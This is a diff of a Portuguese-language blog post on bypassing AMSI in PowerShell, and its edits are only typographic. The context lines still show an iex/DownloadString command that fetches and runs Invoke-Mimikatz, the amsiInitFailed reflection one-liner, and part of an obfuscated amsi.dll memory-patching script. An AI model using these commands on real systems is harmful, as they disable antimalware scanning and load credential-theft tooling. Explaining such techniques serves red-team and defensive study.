@@ -29,7 +29,7 @@ Existem vários métodos conhecidos, e funcionais disponíveis na internet, por�
 
 ## *Bypass* de AMSI no Powershell
 
-Normalmente, para carregar um script PowerShell em memória para evitar detecção de arquivo malicioso por antivírus, utilizamos a função `Invoke-Expression`, em casos normais, como por exemplo, importar o `Invoke-Mimikatz`, utilizamos da seguinte forma:
+Normalmente, para carregar um script PowerShell em memória para evitar detecção de arquivo malicioso por antivírus, utilizamos a função `Invoke-Expression`, em casos normais, como, por exemplo, importar o `Invoke-Mimikatz`, utilizamos da seguinte forma:
 
 ```powershell
 iex(New-object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
@@ -88,11 +88,11 @@ $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
-Basicamente o que estes *snippets* fazem, é desabilitar o PowerShell Script-Logging ou alteram os subvalores do *namespace* `System.Management.Automation`. O `System.Management.Automation` é basicamente o *namespace* raiz do PowerShell.
+Basicamente o que estes *snippets* fazem, é desabilitar o *PowerShell Script-Logging* ou alteram os sub-valores do *namespace* `System.Management.Automation`. O `System.Management.Automation` é basicamente o *namespace* raiz do PowerShell.
 
-O que podemos entender, é que todas estas técnicas, são específicas para o PowerShell, e afetam apenas a interface de verificação antimalware para o código de script do próprio Powershell.
+O que podemos entender, é que estas técnicas, são específicas para o PowerShell, e afetam apenas a interface de verificação *antimalware* para o código de script do próprio Powershell.
 
-Portanto, mesmo alterando os subvalores do *namespace* `System.Management.Automation`, não iremos quebrar o `.NET AMSI-Scan`, pois este não está relacionado com o PowerShell.
+Portanto, mesmo alterando os sub-valores do *namespace* `System.Management.Automation`, não iremos quebrar o `.NET AMSI-Scan`, pois este não está relacionado com o PowerShell.
 
 Acontece que quando iniciamos uma chamada no PwerShell a `amsi.dll` é carregada em um novo processo para fazer o *hook* de qualquer entrada em linha de comando e analisar o conteúdo das chamadas para `[System.Reflection.Assembly]::Load()`. Portanto, uma das técnicas mais eficazes para o *bypass* do .NET AMSI-Scan, é com `memory patching` do `amsi.dll`. Um artigo completo sobre esta técnica pode ser encontrado [aqui](https://rastamouse.me/memory-patching-amsi-bypass/). Neste caso, a `[System.Reflection.Assembly]::Load()` não cria um novo processo, portanto, efetuar o `memory patching` resultara no *bypass* tanto do *script-code* do PowerShell quanto do .NET AMSI-Scan.
 
@@ -154,7 +154,7 @@ $AZKIU = [Byte[]] ($FGJT,$CXWE,$LKAS,$QAWS,+$YHNM,+$PLMN)
 [System.Runtime.InteropServices.Marshal]::Copy($AZKIU, 0, $IMUNT, 6)
 ```
 
-Ao executermos este script, faremos um *bypass* "global" do AMSI, permitindo a execução do script sem erros.
+Ao executarmos este script, faremos um *bypass* "global" do AMSI, permitindo a execução do script sem erros.
 
 ![Bypass global do AMSI](/img/posts/2023-03-06_17-27.png)
 
